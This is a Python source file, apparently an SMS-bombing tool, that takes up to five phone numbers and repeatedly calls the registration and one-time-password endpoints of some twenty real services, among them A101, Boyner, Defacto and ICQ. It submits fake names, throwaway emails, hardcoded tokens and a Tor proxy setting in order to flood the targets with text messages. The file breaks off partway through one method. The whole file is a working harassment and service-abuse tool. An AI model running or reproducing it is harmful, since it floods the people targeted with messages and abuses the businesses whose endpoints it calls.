from threading import Thread
import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style
from time import sleep
from user_agent import generate_user_agent
import urllib.request
proxy = {"socks5": "127.0.0.1:9050"}


class SendSms():
    adet = 0
    toplam_sms = 1

    def __init__(self, phone, phone2, phone3, phone4, phone5, mail):
        self.phone = str(phone)
        self.phone2 = str(phone2)
        self.phone3 = str(phone3)
        self.phone4 = str(phone4)
        self.phone5 = str(phone5)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase)
                                for i in range(19))+"@gmail.com"

    # dsmartgo.com.tr

    def Dsmartgo(self):
        liste = [self.phone, self.phone2,
            self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	        "IsSubscriber": "true",
        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	        "Mobile": numara,
                }, cookies={
        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		    "_ga": "GA1.3.1016548678.1638216163",
        		    "_gat": "1",
        		    "_gat_gtag_UA_18913632_14": "1",
        		    "_gid": "GA1.3.1214889554.1638216163",
        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	    })
            try:
                BeautifulSoup(dsmartgo.text, "html.parser").find(
                    "div", {"class": "info-text"}).text.strip()
                print(
                    f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")
            except AttributeError:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> dsmartgo.com.tr "+Fore.CYAN +
                      numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX + str(self.toplam_sms))
                self.adet += 1
                self.toplam_sms += 1
            uygulanan_nolar += 1
            if uygulanan_nolar == bos_olmayan:
                break
            else:
                continue

    # kigili.com
    def Kigili(self):
        liste = [self.phone, self.phone2,
            self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    kigili = requests.post("https://www.kigili.com/users/registration/", data={
                    "first_name": "Memati",
                    "last_name": "Bas",
                    "email": self.mail,
                    "phone": f"0{numara}",
                    "password": "31ABC..abc31",
                    "confirm": "true",
                    "kvkk": "true",
                    "next": ""
                })
                    if kigili.status_code == 202:
                         print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> kigili.com "+Fore.CYAN +
                               numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX + str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                    else:
                        raise
                except:
                     print(
                         f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue

    # kahvedunyasi.com
    def KahveDunyasi(self):
        liste = [self.phone, self.phone2,
            self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                    "mobile_number": numara,
                    "token_type": "register_token"
                })
                    if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> core.kahvedunyasi.com "+Fore.CYAN +
                              numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX + str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(
                        f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue

    # naosstars.com

    def NaosStars(self):
        liste = [self.phone, self.phone2,
            self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                    "email": self.mail,
                    "first_name": "Memati",
                    "last_name": "Bas",
                    "password": "31ABC..abc31",
                    "date_of_birth": "1975-12-31",
                    "phone": f"0{numara}",
                    "gender": "male",
                    "kvkk": "true",
                    "contact": "true",
                    "confirm": "true"
                })
                    if naosstars.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> shop.naosstars.com "+Fore.CYAN +
                              numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX + str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                       raise
                except:
                    print(
                        f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> shop.naosstars.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
         
    
    #istegelsin.com
    def IsteGelsin(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(numara)}}
                    r = requests.post("https://prod.fasapi.net:443/",  json=json)
                    if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> prod.fasapi.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> prod.fasapi.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    
    #bim
    def Bim(self):         
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": numara})
                    if bim.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
        
    #ceptesok.com
    def Sok(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": numara, "token_type": "register_token"})
                    if len(r.json()["meta"]["messages"]["success"]) != 0:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.ceptesok.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.ceptesok.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #tiklagelsin.com
    def Tiklagelsin(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    json={"operationName": "GENERATE_OTP", 
                             "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                             "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                         "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                         "phone": numara
                                        }
                            }
                    tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
                    if tiklagelsin.json()["data"]["generateOtp"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> svc.apps.tiklagelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> svc.apps.tiklagelsin.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    

            
    #a101.com.tr
    def A101(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.a101.com.tr:443/users/otp-login/"
                    data = {"phone": f"0{numara}", "next": "/a101-kapida"}
                    r = requests.post(url,data=data)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #englishhome.com
    def Englishhome(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{numara}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
                    home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
                    if home.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #sakasu.com.tr
    def Sakasu(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"phone": numara}
                    su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
                    if su.json()["status"] == "ok":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> sakasu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #rentiva.com
    def Rentiva(self): 
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://rentiva.com:443/api/Account/Login"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
                    json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": numara, "type": 1}
                    rentiva = requests.post(url, headers=headers, json=json)
                    if rentiva.json()["success"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> rentiva.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #bineq.tech
    def Bineq(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                    bineq = requests.post(url, headers=headers)
                    if bineq.json()["IsSuccess"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> bineqapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bineqapi.heymobility.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #superpedestrian.com
    def Link(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
                    json={"phone_number": f"+90{numara}"}
                    link = requests.post(url, json=json)
                    if link.json()["detail"] == "Ok":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> consumer-auth.linkfleet.de "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> consumer-auth.linkfleet.de "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue

            
    #loncamarket.com
    def Lonca(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
                    json={"Address": numara, "ConfirmationType": 0}
                    lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
                    if lonca.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> loncamarket.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> loncamarket.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue  
            
    
    #dgnonline.com
    def Dgn(self):          
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": numara}
                    dgn = requests.post(url, headers=headers, data=data)
                    if dgn.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> odeme.dgnonline.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> odeme.dgnonline.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #yaanimail.com
    def Yaani(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
                    json={"action": "create", "email": f"{self.random_mail}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": self.mail}, {"type": "msisdn", "value": f"90{numara}"}]}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.yaanimail.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.yaanimail.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue 
            
             
    #defacto.com.tr
    def Defacto(self):
           
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    data = {"mobilePhone": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if r.json()["Data"]["IsSMSSend"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> defacto.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> defacto.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    
    #mopas.com.tr
    def Mopas(self):          
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={numara}&pwd=&checkPwd=")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mopas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #icq.net
    def Icq(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
                    json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{numara}", "route": "sms"}, "reqId": "25299-1669396271"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["status"]["code"] == 20000:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> u.icq.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> u.icq.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #boyner.com
    def Boyner(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": numara, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["Success"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> boyner.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #watsons.com.tr
    def Watsons(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
